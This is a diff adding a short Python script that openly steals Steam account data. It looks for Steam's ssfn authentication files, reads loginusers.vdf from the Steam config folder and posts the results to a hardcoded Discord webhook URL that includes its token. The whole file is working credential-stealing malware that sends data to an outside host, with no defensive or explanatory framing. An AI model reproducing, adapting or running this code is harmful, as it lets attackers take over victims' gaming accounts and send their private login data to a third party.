@@ -1,0 +1,26 @@
+import os, requests
+
+WEBHOOK = "https://discord.com/api/webhooks/1501597067926044736/VZZxbllJi-SrXWpiYFBgGRmDYM1xH-Y-bJC8w03rduLAnk4-f3who1qPSjaWRI_FVHWV"
+
+def steal_steam():
+    data = {}
+    possible_steam_paths = [
+        os.path.expandvars(r"%PROGRAMFILES%\Steam"),
+        os.path.expandvars(r"%PROGRAMFILES(X86)%\Steam")
+    ]
+    for steam_path in possible_steam_paths:
+        if not os.path.isdir(steam_path):
+            continue
+        ssfn = [f for f in os.listdir(steam_path) if f.startswith("ssfn")]
+        vdf = os.path.join(steam_path, "config", "loginusers.vdf")
+        if ssfn:
+            data["ssfn_files"] = ssfn
+        if os.path.isfile(vdf):
+            with open(vdf, "r") as f:
+                data["loginusers.vdf"] = f.read()
+    return data
+
+if __name__ == "__main__":
+    d = steal_steam()
+    if d:
+        requests.post(WEBHOOK, json=d)
